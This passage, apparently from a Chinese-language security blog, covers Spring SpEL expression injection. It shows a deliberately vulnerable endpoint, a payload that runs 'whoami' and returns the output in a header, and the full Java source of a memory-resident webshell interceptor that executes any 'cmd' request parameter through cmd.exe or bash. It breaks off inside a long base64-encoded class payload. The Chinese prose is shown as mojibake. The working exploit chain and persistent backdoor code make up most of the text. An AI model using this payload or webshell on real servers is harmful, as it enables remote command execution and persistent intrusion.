class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">StandardEvaluationContext</span> context<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span>#response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token char">'x-cmd'</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯åœ¨å“åº”ä½“é‡Œé¢å°±ä¼šå¸¦å‡º<code>x-cmd</code>è¿™ä¸ªå‚æ•°</p><hr><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAA<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥å°±é€æ­¥è§£æä¸€ä¸‹è¿™ä¸ªpayloadï¼š</p><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç¡®è®¤æˆ‘ä»¬çš„ç›®çš„ï¼Œæˆ‘ä»¬ç›®çš„å°±æ˜¯åŠ è½½ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”å°†å…¶å®ä¾‹åŒ–ã€‚è¿™é‡Œé€‰æ‹©äº†springbootè‡ªå¸¦çš„å·¥å…·ç±»<code>ReflectUtils</code>ï¼Œå› ä¸ºä»–è¯†åˆ«base64å­—èŠ‚ï¼Œç„¶ååŠ è½½å®ƒã€‚å¾ˆæ–¹ä¾¿ã€‚</p><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>åŠ è½½ä¸€ä¸ªç±»éœ€è¦æŒ‡å®šclassloaderï¼Œæˆ‘ä»¬è‚¯å®šé€‰å®šå½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡çš„classLoader<br><code>T(java.lang.Thread).currentThread().getContextClassLoader()</code></p><p>ç¬¬ä¸€ä¸ªpayloadç”¨åˆ°äº†MLetè¿™ä¸ªç±»ï¼Œå®é™…ä¸Šæ˜¯URLClassLoaderçš„å®ç°ç±»</p><hr><h3 id="springbootå†…å­˜é©¬"><a href="#springbootå†…å­˜é©¬" class="headerlink" title="springbootå†…å­˜é©¬"></a>springbootå†…å­˜é©¬</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span><span class="token class-name">AbstractHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InceptorMemShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"staart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            field <span class="token operator">=</span> <span class="token class-name">AbstractHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"adaptedInterceptors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span> adaptInterceptors <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            adaptInterceptors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">InceptorMemShell</span> evilInterceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InceptorMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        adaptInterceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>evilInterceptor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ProcessBuilder</span> builder<span class="token punctuation">;</span>                <span class="token class-name">String</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"wocaosinidema"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                o <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> c<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> o<span class="token punctuation">;</span>                c<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                printWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">postHandle</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> modelAndView<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">afterCompletion</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæœ€ç»ˆçš„payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAADQBAQoAOwCLCABWCwCMAI0IAI4LAI8AkAsAjwCRCACSCACTCgCUAJUKAA4AlggAlwoADgCYBwCZBwCaCACbCACcCgANAJ0IAJ4IAJ8HAKAKAA0AoQoAogCjCgAUAKQIAKUKABQApgoAFACnCgAUAKgKABQAqQoAqgCrCgCqAKwKAKoAqQcArQoAIACuCwA8AK8LADwAsAkAlACxCACyCgCzAKsKALQAtQgAtgsAtwC4BwC5BwC6CwAqALsHALwIAL0KAL4AvwcAwAoAMACuCgDBAMIKAMEAwwcAxAcAxQoANQCuBwDGCgA3AIsLADQAxwgAyAcAyQcAygEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTEluY2VwdG9yTWVtU2hlbGw7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB2J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAxgcAywcAzAcAzQcAmgcAzgcAmQcAoAcArQEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9